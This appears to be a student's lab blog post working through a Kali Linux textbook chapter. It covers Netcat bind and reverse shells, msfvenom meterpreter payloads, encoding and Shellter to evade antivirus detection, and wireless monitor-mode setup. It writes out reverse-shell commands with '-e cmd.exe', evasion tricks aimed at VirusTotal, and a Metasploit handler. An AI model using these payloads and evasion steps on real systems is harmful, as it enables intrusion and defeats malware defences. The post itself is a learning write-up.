+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-fundamentals-of-bind-and-reverse-shells">1. Fundamentals of Bind and Reverse Shells</a>
+      <ul>
+        <li><a href="#12-creating-a-reverse--binding-shell-with-netcat">1.2 Creating a Reverse &amp; Binding Shell with Netcat</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-anti-malware-evasion-techniques">2. Anti-malware Evasion Techniques</a>
+      <ul>
+        <li><a href="#21-encoding-payloads-with-msfvenom">2.1 Encoding Payloads with MSFvenom</a></li>
+        <li><a href="#22-using-shellter-to-reduce-detection">2.2 Using Shellter to reduce detection</a></li>
+        <li><a href="#23-using-msf-to-send-a-reverse-shell-attack">2.3 Using MSF to Send a Reverse Shell Attack</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-wireless-adaptor-setup">3. Wireless Adaptor Setup</a>
+      <ul>
+        <li><a href="#31-different-types-of-adaptor-modes">3.1 Different types of Adaptor Modes</a></li>
+        <li><a href="#32-changing-between-managed-and-monitor-mode">3.2 Changing between Managed and Monitor Mode</a></li>
+        <li><a href="#33-testing-for-packet-injection-compatibility">3.3 Testing for Packet Injection Compatibility</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+
+            
+            
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+  <details
+    class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 ml-0"
+    >
+    
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-primary-800 dark:text-neutral-100">
+    Ultimate-Kali-Linux-Book -
+    This article is part of a series.
+  </summary>
+  
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-2-reconnaissance-and-footprint/">
+          Part 2:
+          Part 2 Reconnaissance and Footprint
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-1-buidling-a-penetration-testing-labs/">
+          Part 2:
+          Part 1 Building a Penetesting Lab
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-3-exploring-active-reconnaissance-techniques/">
+          Part 3:
+          Part 3 Exploring Active Reconnaissance Techniques
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-4-performing-vulnerability-assessments/">
+          Part 4:
+          Part 4 Performing Vulnerability Assessments
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        Part 5:
+        This Article
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-6-all-on-networking-penetration-baby/">
+          Part 6:
+          Part 6 All on Networking Penetration Baby
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-7-advanced-network-penetration-testing-post-exploitation/">
+          Part 7:
+          Part 7 Advanced Network Penetration Testing Post Exploitation
+        </a>
+      </div>
+    
+  
+
+
+  </details>
+
+
+
+
+        <div class="article-content max-w-prose mb-20">
+          <p>Hey it&rsquo;s me again  , I know you&rsquo;ve been missing me and I have to same to you as well. Time has changed in my life for the better, I&rsquo;ve met the competitive hacking team at another close by University and would love to learn from them as they&rsquo;re seniors in the field of CTF. I want to be by their side and learn from them to grow as a person and a professional penetration tester.</p>
+<p>I&rsquo;ve also found a job at a college which has amazing architecture, truly wonderful to look at. I will use the funds to help me with travels for Uni, lunch and future projects that you might see on this blog so stay tuned. (^・ω・^ )</p>
+<p>Anyways, enough of a life update lets talk Networking and Shells! I will be exploring <strong>Netcat</strong> to create connections between my Kali machine and a victim Windows machine. Will also be going over <strong>Anti-malware evasion techniques</strong> to reduce Virustotal scores when scanning payloads created using scripts. And finally test out my wireless adapter that I got for cheap for packet injection and Monitor mode compatibility with <strong>Aireplay-ng</strong>.</p>
+<p>This ones a short one guys so I&rsquo;ll give it my best, I know I&rsquo;m only using scripts and pre-made tools yet and not reversing engineering yet but put a bit of trust in me. I have a small flame inside of me, waiting for small chips of wood to be thrown inside to grow bigger into a roaring flame to not only light up my path in dark times but also for others I care about around me.</p>
+
+<h2 class="relative group">1. Fundamentals of Bind and Reverse Shells 
+    <div id="1-fundamentals-of-bind-and-reverse-shells" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#1-fundamentals-of-bind-and-reverse-shells" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>A <strong>reverse shell</strong> is a one way connection from the victim -&gt; attacker, from there they would be able to perform remote code execution or monitor for the victims behaviour, keystrokes, screen sharing and more.</p>
+<p>A <strong>binding shell</strong> uses inbound firewall rules meaning that the connection originates from the victim -&gt; attacker.</p>
+
+<h3 class="relative group">1.2 Creating a Reverse &amp; Binding Shell with Netcat 
+    <div id="12-creating-a-reverse--binding-shell-with-netcat" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#12-creating-a-reverse--binding-shell-with-netcat" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>There is a Windows version of Netcat on Kali at this directory <code>/usr/share/windows-binaries</code> which will be uploaded to the victims computer which when executed will open the shell.</p>
+<ol>
+<li>Get the file onto the victims machine, for this example we will be connected on the same network and I will be using a Python server to transfer, <code>cd</code> into windows-binaries and execute <code>python3 -m http.server 8080</code></li>
+<li>On victims machine in a browser: <code>&lt;kaliIP&gt;:8080</code>
+
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="Python-server-nc.exe"
+    srcset="
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/Python-server-nc.exe_hu_b6390395ce219337.png  330w,
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/Python-server-nc.exe_hu_d97cde68281251b.png  660w,
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/Python-server-nc.exe_hu_a13173e4803139d3.png 1280w
+    "
+    data-zoom-src="/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/Python-server-nc.exe.png"
+    src="/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/Python-server-nc.exe.png">
+
+  
+</figure>
+</li>
+<li>Click on <code>nc.exe</code> as the victim and close Python web server</li>
+<li>Execute the following in a terminal on kali <code>nc -nlvp 1234</code> on bob&rsquo;s <code>nc -nv &lt;kaliIP&gt; 1234 -e cmd.exe</code></li>
+<li>To create a bind shell on kali <code>nc -nlvp 1234 -e /bin/bash</code> and on bob&rsquo;s <code>nc -nv &lt;kaliIP&gt; 1234</code>, this will allow bob to send commands to kali</li>
+</ol>
+<p>ik this above isn&rsquo;t what I&rsquo;ve talked about as I&rsquo;ve lost the gif for Netcat but here is a payload created by MSF using vnc.exe ^^</p>
+
+<h2 class="relative group">2. Anti-malware Evasion Techniques 
+    <div id="2-anti-malware-evasion-techniques" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#2-anti-malware-evasion-techniques" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Most Anti malware work in 3 main categories:</p>
+<ul>
+<li><strong>Signature-base detection:</strong> Anti-malware software will use a database of known malicious code and compare it to scans</li>
+<li><strong>Behavioural-based detection:</strong> This is where the actions taken by malware is monitored by being placed in a Virtual environment for changes in the system</li>
+<li><strong>Heuristic-based:</strong> This is where the anti-malware software uses rules and algorithms to determine if malware has been detected</li>
+</ul>
+
+<h3 class="relative group">2.1 Encoding Payloads with MSFvenom 
+    <div id="21-encoding-payloads-with-msfvenom" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#21-encoding-payloads-with-msfvenom" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ol>
+<li>Using the reverse shell from the Netcat shell executable I will be using MSFvenom which allows for custom payload creation via scripts.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -h                <span class="c1"># Help menu</span>
+</span></span><span class="line"><span class="cl">msfvenom --list payloads   <span class="c1"># Available Payload list</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Create first payload</span>
+</span></span><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f exe -o payload.exe
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="msfvenom-payload-1"
+    srcset="
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/msfvenom-payload-1_hu_a61524978d921ecc.png  330w,
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/msfvenom-payload-1_hu_5d47cedab3a9b6ea.png  660w,
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/msfvenom-payload-1_hu_9867eb5b79f251eb.png 1280w
+    "
+    data-zoom-src="/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/msfvenom-payload-1.png"
+    src="/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/msfvenom-payload-1.png">
+
+  
+</figure>
+
+2. Putting the <code>payload.exe</code> file into <a
+  href="https://www.virustotal.com"
+    target="_blank"
+  >https://www.virustotal.com</a> will give out these detection ratings:
+
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="msfvenom-virtustotal-payload-1"
+    srcset="
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/msfvenom-virtustotal-payload-1_hu_48a7c73eb660b31f.png  330w,
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/msfvenom-virtustotal-payload-1_hu_f628946e8a724756.png  660w,
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/msfvenom-virtustotal-payload-1_hu_581eafd1a484d45d.png 1280w
+    "
+    data-zoom-src="/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/msfvenom-virtustotal-payload-1.png"
+    src="/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/msfvenom-virtustotal-payload-1.png">
+
+  
+</figure>
+
+
+  
+  
+  
+  
+
+
+
+<div
+  
+    class="flex px-4 py-3 rounded-md" style="background-color: #fcf0e8"
+  
+  >
+  <span
+    
+      class="ltr:pr-3 rtl:pl-3 flex items-center" style="color: #eb974c"
+    
+    >
+    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
+
+  </span>
+
+
+  </span>
+
+  <span
+    
+      style="color: #eb974c"
+    
+    >Virustotal and other mainstream web scanners will distribute the hash of the payload:</span>
+</div>
+
+A way to combat my malware being known is by using a no distribution scanner.
+3. Using the highest rated encoder and iterating the encoding 9 times:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f exe -o payload2.exe -e x86/shikata_ga_nai -i <span class="m">9</span>
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="msfvenom-virtustotal-payload-2"
+    srcset="
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/msfvenom-virtustotal-payload-2_hu_798304e32a88b5f2.png  330w,
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/msfvenom-virtustotal-payload-2_hu_da57edb622231041.png  660w,
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/msfvenom-virtustotal-payload-2_hu_6964348545946cf0.png 1280w
+    "
+    data-zoom-src="/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/msfvenom-virtustotal-payload-2.png"
+    src="/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/msfvenom-virtustotal-payload-2.png">
+
+  
+</figure>
+
+Doesn&rsquo;t even lower it by much 😭😭</p>
+<ol start="4">
+<li>Giving it a executable to encode with the template to mask out anti-malware signature detection</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f exe -o payload2.exe -e x86/shikata_ga_nai -i <span class="m">9</span> -x /etc/share/windows-binaries/whoami.exe
+</span></span></code></pre></div>
+<h3 class="relative group">2.2 Using Shellter to reduce detection 
+    <div id="22-using-shellter-to-reduce-detection" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#22-using-shellter-to-reduce-detection" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li>Go through the <a
+  href="https://wiki.winehq.org/Download"
+    target="_blank"
+  >Wine installation guide</a> with <code>wine32</code> and install Shellter with <code>sudo apt install shellter</code></li>
+</ul>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="Shellter-Encoding-Demo" src="/images/Shellter-Encoding-Demo.gif">
+
+  
+</figure>
+</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="Shellter-virustotal-payload-1"
+    srcset="
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/Shellter-virustotal-payload-1_hu_e773497e458b9ba5.png  330w,
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/Shellter-virustotal-payload-1_hu_ff30b65f98da1865.png  660w,
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/Shellter-virustotal-payload-1_hu_88bc30d70b731be3.png 1280w
+    "
+    data-zoom-src="/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/Shellter-virustotal-payload-1.png"
+    src="/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/Shellter-virustotal-payload-1.png">
+
+  
+</figure>
+</p>
+
+<h3 class="relative group">2.3 Using MSF to Send a Reverse Shell Attack 
+    <div id="23-using-msf-to-send-a-reverse-shell-attack" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#23-using-msf-to-send-a-reverse-shell-attack" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ol>
+<li>Will need to transfer file same method as transferring ncat in part 1.2</li>
+<li>Will be using metasploitable to listen to the payload</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfconsole
+</span></span><span class="line"><span class="cl">msf6 &gt; use exploit/multi/handler
+</span></span><span class="line"><span class="cl">msf6 <span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> payload windows/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl">msf6 <span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> LHOST &lt;attacker IP&gt;
+</span></span><span class="line"><span class="cl">msf6 <span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> AutoRunScript post/windows/manage/migrate
+</span></span><span class="line"><span class="cl">msf6 <span class="o">(</span>multi/handler<span class="o">)</span> &gt; exploit
+</span></span></code></pre></div><p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="Reverse-shell-demo" src="/images/Reverse-shell-demo.gif">
+
+  
+</figure>
+
+(Right-click &gt; Open Image in New Tab)</p>
+
+<h2 class="relative group">3. Wireless Adaptor Setup 
+    <div id="3-wireless-adaptor-setup" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#3-wireless-adaptor-setup" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>For the final part of this section I will be testing out my wireless adapter which was bought off Aliexpress a long time ago and just resurfaced for this which I&rsquo;m happy about.</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="Wireless adapter"
+    srcset="
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/Wireless-adapter_hu_d194ddaa87b0c438.jpg  330w,
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/Wireless-adapter_hu_3b8e24c958a35f.jpg  660w,
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/Wireless-adapter_hu_2d5b31c241d7c175.jpg 1280w
+    "
+    data-zoom-src="/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/Wireless-adapter.jpg"
+    src="/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/Wireless-adapter.jpg">
+
+  
+</figure>
+</p>
+
+<h3 class="relative group">3.1 Different types of Adaptor Modes 
+    <div id="31-different-types-of-adaptor-modes" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#31-different-types-of-adaptor-modes" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>There are several modes available for a network adaptor to switch to which all have their separate purposes:</p>
+<ul>
+<li><strong>Managed mode:</strong> The default type which will allow connections to other AP</li>
+<li><strong>Monitor mode:</strong> This mode will allow for wireless network scanning and packet injection</li>
+<li><strong>Repeater mode:</strong> Echo&rsquo;s a WiFi connection like an extender</li>
+<li><strong>Master mode:</strong> Allow Linux-based system to operate as APs'</li>
+</ul>
+
+<h3 class="relative group">3.2 Changing between Managed and Monitor Mode 
+    <div id="32-changing-between-managed-and-monitor-mode" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#32-changing-between-managed-and-monitor-mode" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>There are two main methods to enable monitor and switching back to managed mode:</p>
+<ul>
+<li><strong>Manually:</strong></li>
+</ul>
+<pre tabindex="0"><code>$ ifconfig wlan0 down
+$ iwconfig mode monitor wlan0 
+$ ifconfig wlan0 up
+</code></pre><ul>
+<li><strong>Using airmon-ng:</strong></li>
+</ul>
+<pre tabindex="0"><code>$ airmon-ng check kill 
+$ airmon-ng start wlan0 
+$ airmon-ng stop wlan0
+</code></pre>
+<h3 class="relative group">3.3 Testing for Packet Injection Compatibility 
+    <div id="33-testing-for-packet-injection-compatibility" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#33-testing-for-packet-injection-compatibility" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Once in monitor mode I can see if the adaptor has packet injection capabilities with <code>aireplay-ng -9 wlan0</code></p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="packet-injection-testing"
+    srcset="
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/packet-injection-testing_hu_f65274b87f028475.png  330w,
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/packet-injection-testing_hu_c687c497218c1c60.png  660w,
+      /posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/packet-injection-testing_hu_c84dc717c7b47c08.png 1280w
+    "
+    data-zoom-src="/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/packet-injection-testing.png"
+    src="/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shell/packet-injection-testing.png">
+
+  
+</figure>
+</p>
+<p>Well this pretty much covers everything for the fifth part of ‘The Ultimate Kali Linux Book’ by Glen D. Singh. This was a short one but I learned a bit on the different shell types, using encoders to mask out known exploits by anti-malware software and testing out my wireless adapter for later testing. Glad you had a good read for this one, hope you&rsquo;re doing OK wherever you are. Bye.
+
+
+
+
+
+<img src="Cat-with-heart-excited.gif" alt="alt text" style="width: 30px; height: 30px;">
+</p>
+
+          
+          
+          
+        </div>
+
+        
+
+        
+  <details class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 ml-0">
+    
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-primary-800 dark:text-neutral-100">
+    Ultimate-Kali-Linux-Book -
+    This article is part of a series.
+  </summary>
+  
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-2-reconnaissance-and-footprint/">
+          Part 2:
+          Part 2 Reconnaissance and Footprint
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-1-buidling-a-penetration-testing-labs/">
+          Part 2:
+          Part 1 Building a Penetesting Lab
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-3-exploring-active-reconnaissance-techniques/">
+          Part 3:
+          Part 3 Exploring Active Reconnaissance Techniques
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-4-performing-vulnerability-assessments/">
+          Part 4:
+          Part 4 Performing Vulnerability Assessments
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        Part 5:
+        This Article
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-6-all-on-networking-penetration-baby/">
+          Part 6:
+          Part 6 All on Networking Penetration Baby
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-7-advanced-network-penetration-testing-post-exploitation/">
+          Part 7:
+          Part 7 Advanced Network Penetration Testing Post Exploitation
+        </a>
+      </div>
+    
+  
+
+
+  </details>
+
+
+        
+
+        
+  
+  
+    <h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
+    <section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
+      
+        
+
+  <a href="/posts/ultimate-kali-linux-book/part-4-performing-vulnerability-assessments/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/ultimate-kali-linux-book/part-4-performing-vulnerability-assessments/featured_hu_400ffdd2c2cf415d.jpg);"></div>
+        
+      
+
+
+    <div class="px-6 py-4">
+      
+        <div
+          class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/ultimate-kali-linux-book/part-4-performing-vulnerability-assessments/">
+          Part 4 Performing Vulnerability Assessments
+        </div>
+      
+
+
+      <div class="text-sm text-neutral-500 dark:text-neutral-400">
+        
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2024-04-26T12:22:20&#43;00:00">26 Apr, 2024</time><span class="px-2 text-primary-500">&middot;</span><span>1379 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">7 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/categories/walkthrough/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Walkthrough
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/osint/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    OSINT
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/vulnerability/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
